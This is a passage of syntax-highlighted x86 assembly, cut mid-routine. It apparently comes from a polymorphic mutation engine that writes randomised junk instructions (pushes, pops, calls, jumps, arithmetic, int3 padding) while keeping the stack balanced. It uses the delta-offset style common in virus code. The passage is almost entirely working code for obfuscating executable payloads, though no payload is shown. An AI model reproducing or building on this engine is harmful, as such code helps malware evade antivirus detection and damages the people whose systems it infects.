        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_maxjmps</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">      </span><span class="sc1">; don't nest too much nor</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">just_exit_call</span><span class="sc0">                   </span><span class="sc1">; put pushes/pops in subs and</span><span class="sc0">
                                                 </span><span class="sc1">; we can't know wassup in</span><span class="sc0">
                                                 </span><span class="sc1">; conditional jumps and such</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_inacall</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">          </span><span class="sc1">; 00h and 01h push</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">do_push</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc0">           </span><span class="sc1">; 02h - 05h pops (more probable so final stack</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">do_pop</span><span class="sc0">          </span><span class="sc1">; correction should be needed less often)</span><span class="sc0">

        </span><span class="sc1">; 06,07 do a call</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">           </span><span class="sc1">; place for offset</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; jump offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; call offset</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">    </span><span class="sc1">; this is the called "subroutine"</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">      </span><span class="sc1">; more ways of getting back from subroutine,</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; either with normal ret or by correcting the</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">normal_ret</span><span class="sc0">      </span><span class="sc1">; stack by popping or by adding to esp</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">popintoreg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c483h</span><span class="sc0">       </span><span class="sc1">; add esp,</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_ngo</span><span class="sc0">
</span><span class="sc5">popintoreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">         </span><span class="sc1">; pop base</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_ngo</span><span class="sc0">
</span><span class="sc5">normal_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">         </span><span class="sc1">; ret</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_ccs</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">         </span><span class="sc1">; int3, usual after subroutines in win32s</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">store_ngo</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">no_ccs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; jump offset</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">exit_ppc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_inacall</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">just_exit_call</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">maths_immediate_short</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">maths_immediate_1</span><span class="sc0">

</span><span class="sc5">maths_immediate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">maths_immediate_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0"> </span><span class="sc1">; 0 to 7</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; * 8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">        </span><span class="sc1">; the base</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">          </span><span class="sc1">; prefix</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">not_a_shortone</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">not_a_shortone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">not_a_shortone2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">not_a_shortone2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">put_immediates</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">         </span><span class="sc1">; is a CMP</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_compare</span><span class="sc0">
</span><span class="sc5">make_jmp_after_cmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">01b</span><span class="sc0">         </span><span class="sc1">; long or short jump</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">          </span><span class="sc1">; short jump</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">make_jump</span><span class="sc0">
</span><span class="sc5">not_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">cdq_jmps_savestack</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_c_j_ss</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">change_jump</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">not_cdq_cbw</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0101b</span><span class="sc0"> </span><span class="sc1">; EAX and EDX for cbw,cwd,cdq,cwde</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">exit_c_j_ss</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exit_c_j_ss</span><span class="sc0">
</span><span class="sc5">not_cdq_cbw</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pushandmov</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; this is used for dimension</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">do_that_fjump</span><span class="sc0">           </span><span class="sc1">; do as for conditional ones</span><span class="sc0">
</span><span class="sc5">pushandmov</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">select_save</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit_c_j_ss</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">                  </span><span class="sc1">; push</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">                   </span><span class="sc1">; so it won't be erased from stack</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">unset_used</span><span class="sc0">              </span><span class="sc1">; mark that as unused one</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                   </span><span class="sc1">; push the reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">          </span><span class="sc1">; pop opcode</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_pushed</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_used</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc5">exit_c_j_ss</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">gen_one_byters</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
</span><span class="sc5">make_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">one_byters</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get onebyter</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">not_jump</span><span class="sc0">
</span><span class="sc5">do_that_fjump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_maxjmps</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">        </span><span class="sc1">; don't nest too much</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">just_exit</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_maxjmps</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0e9h</span><span class="sc0">                 </span><span class="sc1">; for unconditional ones skip some</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">skip_unc</span><span class="sc0">                </span><span class="sc1">; things</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_longjump</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                  </span><span class="sc1">; long prefix</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">not_longjump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">skip_unc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; type of jump</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; first off</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_longone</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">not_longone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; offset of jump</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">t_maxjmps</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">long_jumper</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">                 </span><span class="sc1">; if not too big then use it</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">good_jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; else forget everything</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">good_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">long_jumper</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">not_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">just_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mem_assign</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">058bh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mem_common</span><span class="sc0">

</span><span class="sc5">mem_mathops</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">  </span><span class="sc1">; 0 to 7</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; base</span><span class="sc0">
</span><span class="sc5">mem_common</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; *8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">          </span><span class="sc1">; base for eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_dimension</span><span class="sc0">

</span><span class="sc1">; now offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_address</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">                  </span><span class="sc1">; is a cmp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">make_jmp_after_cmp</span><span class="sc0">      </span><span class="sc1">; if so force a compare</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">mov_registers</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">          </span><span class="sc1">; random source</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08bh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_register</span><span class="sc0">            </span><span class="sc1">; useful dest</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">g_dimension</span><span class="sc0">

</span><span class="sc5">maths_registers</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_al7</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
